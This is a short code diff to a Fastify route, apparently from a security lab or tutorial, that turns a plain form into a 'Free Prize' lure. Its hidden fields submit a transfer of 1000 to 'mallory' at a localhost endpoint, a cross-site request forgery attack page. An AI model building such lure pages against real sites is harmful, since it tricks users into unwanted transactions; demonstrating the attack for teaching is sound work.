@@ -12,9 +12,12 @@ fastify.get("/", function (request, reply) {
   <title>App</title>
 </head>
 <body>
-  <h1>App</h1>
-  <form method="POST" action="http://localhost:3000/text">
-    <button type="submit">Submit</button>
+  <h1>Free Prize</h1>
+  <p>Claim your reward below.</p>
+  <form method="POST" action="http://localhost:3000/transfer">
+    <input type="hidden" name="to" value="mallory" />
+    <input type="hidden" name="amount" value="1000" />
+    <button type="submit">Claim reward</button>
   </form>
 </body>
 </html>`);
